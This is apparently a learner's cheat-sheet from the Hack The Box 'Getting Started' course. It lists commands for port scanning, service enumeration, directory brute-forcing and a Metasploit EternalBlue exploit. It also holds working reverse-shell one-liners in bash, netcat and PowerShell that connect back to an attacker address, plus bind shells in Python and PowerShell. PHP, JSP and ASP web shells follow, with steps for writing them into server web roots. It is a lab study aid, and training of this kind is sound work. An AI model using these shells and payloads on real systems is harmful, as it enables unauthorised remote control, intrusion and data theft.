# GettingStarted(HTB)
Lessons and Tutorials Covered

## NCAT
# netcat can be used to connect to any listening port and interact with the service running on that port.
> ncat ip port 
> nc -nv ip port

## NMAP
# port scanner
> nmap -sV -sC -p- 10.129.42.253
> whatweb --no-errors 10.10.10.0/24
> nmap -sV --script=banner -p21 10.10.10.0/24
> nmap -sC -sV -p21 10.129.42.253
> nmap --script smb-os-discovery.nse -p445 10.10.10.40
> nmap -A -p445 10.129.42.253

> locate scripts/citrix
> nmap --script <script name> -p<port> <host>
  
  ## Connecting 
  # ftp =   ftp -p 10.129.42.253
  # smb =   smbclient -N -L \\\\10.129.42.253
    smbclient \\\\10.129.42.253\\users
    smbclient -U bob \\\\10.129.42.253\\users
  # snmp =   snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
    snmpwalk -v 2c -c private  10.129.42.253 
    onesixtyone -c dict.txt 10.129.42.254
  
  
  ## WEB Enumb
  # banner grabbing
  > curl -IL https://www.inlanefreight.com
  > whatweb 10.10.10.121
  > whatweb --no-errors 10.10.10.0/24
  # scan web directories
  > gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt
  # install seclists = git clone https://github.com/danielmiessler/SecLists && sudo apt install seclists -y
  # Next, add a DNS Server such as 1.1.1.1 to the /etc/resolv.conf file.
  > gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
  
  ## Exploit Scan
  # sudo apt install exploitdb -y
  > searchsploit openssh 7.2
  ## Metasploit
  # Metasploit Framework (MSF) contains exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets
  > msfconsole
    > search exploit eternalblue
    > use exploit/windows/smb/ms17_010_psexec
    > set RHOSTS 10.10.10.40
    > check
    > exploit
  
  ## Reverse Shell
  # on my computer
  > nc -lvnp 1234
  > nc 10.10.10.1 1234
  # on host
  > bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
  > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
  > powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
## BIND Shell
  #
  > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
  > python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
> powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
## Once in
  > python -c 'import pty; pty.spawn("/bin/bash")'
  
  ## WEB SHELLS
Apache	/var/www/html/   Nginx	/usr/local/nginx/html/   IIS	c:\inetpub\wwwroot\   XAMPP	C:\xampp\htdocs\
php = <?php system($_REQUEST["cmd"]); ?>
jsp = <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
asp = <% eval request("cmd") %>
  # eg = echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
  # browser http://SERVER_IP:PORT/shell.php?cmd=id    or curl http://SERVER_IP:PORT/shell.php?cmd=id
  
  

* File Inclusion / Directory Traversal (HTB Academy)
* Linux Fundermentals (HTB Academy)
* Login Attacks (HTB Academy)
* Metasploit (HTB Academy)
* Nmap (HTB Academy)
* Web Enumeration
* Windows Fundermentals (HTB Academy)

##### Connect to VPN
> sudo openvpn user.ovpn
